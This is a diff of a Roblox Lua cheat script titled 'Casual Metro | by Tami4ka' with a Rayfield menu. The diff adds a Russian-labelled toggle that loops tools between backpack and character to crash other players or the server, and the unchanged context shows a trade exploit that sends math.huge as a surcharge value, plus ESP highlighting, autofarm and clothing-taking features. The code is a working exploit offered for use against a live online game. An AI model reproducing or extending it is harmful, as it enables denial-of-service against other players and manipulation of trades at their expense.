@@ -16,6 +16,7 @@ _G.AutoFarm = false
 _G.LagMachine = false
 _G.TakeClothing = false
 _G.TakeAllClothing = false
+_G.AutoCrashServer = false
 
 local function DrawEsp(esp, color)
 	local Highlight = Instance.new("Highlight")
@@ -58,7 +59,7 @@ local function espEnable(ClothingList, ClothingType, string)
 				end
 			 end
 		elseif obj:FindFirstChild("Highlight") then
-			if obj.Shirt.ShirtTemplate == "rbxassetid://1" then
+			if obj[ClothingType][ClothingType.."Template"] == "rbxassetid://1" then
 				obj.Highlight:Destroy()
 			end
 		end
@@ -75,8 +76,8 @@ end
 
 local function equipTool(Tool)
     if Tool and Tool:IsA("Tool") then 
-        Tool.ManualActivationOnly = true 
-        Tool.Parent = localPlayer.Character 
+        Tool.Parent = localPlayer.Character
+
 		task.delay(0.2, function()
 			Tool.Parent = game.ReplicatedStorage.ToolFolders
 		end)
@@ -215,7 +216,6 @@ local LegaList = {
 	"14387015395",
 	"8195412170",
 	"8656691531",
-	"14752060743",
 	"17540162234",
 	"12867315395"
 }
@@ -282,7 +282,6 @@ local Window = Rayfield:CreateWindow({Name = "Casual Metro | by Tami4ka", Loadin
     },
  	KeySystem = false})
 
-
 local function Notify(name, content, time)
 	Rayfield:Notify({
 		Title = name,
@@ -321,6 +320,50 @@ Misc:CreateButton({
 	Name = "Поставить отрицательное число в доплате [Trade]",
 	Callback = function()
 		game:GetService("ReplicatedStorage").TradeRemote.Doplata:FireServer(math.huge)
+	end
+})
+
+Misc:CreateToggle({
+	Name = "Попытка крашнуть игрока (Нужно много вещей)",
+	CurrentValue = false,
+	Callback = function(toggle)
+		if toggle then
+			_G.AutoCrashServer = true
+
+			-- game:GetService("RunService"):Set3dRenderingEnabled(false)
+
+			for index, tool in game.ReplicatedStorage.ToolFolders:GetChildren() do
+				tool.Parent = localPlayer.Backpack
+				
+				for index, obj in tool:GetChildren() do
+					obj:Destroy()
+				end
+			end
+
+            while _G.AutoCrashServer do
+				for index, tool in localPlayer.Backpack:GetChildren() do
+					task.spawn(function()
+						task.wait()
+						tool.Parent = localPlayer.Character
+					end)
+				end
+
+				task.wait(0.5)
+
+				for index, tool in localPlayer.Character:GetChildren() do
+					if tool:IsA("Tool") then
+						task.spawn(function()
+							task.wait()
+							tool.Parent = localPlayer.Backpack
+						end)
+					end
+				end
+            end
+
+			-- game:GetService("RunService"):Set3dRenderingEnabled(true)
+		else
+			_G.AutoCrashServer = false
+		end
 	end
 })
 
@@ -571,4 +614,3 @@ Dev:CreateButton({
 		setclipboard(ID:gsub("%D", ""))
 	end
 })
-
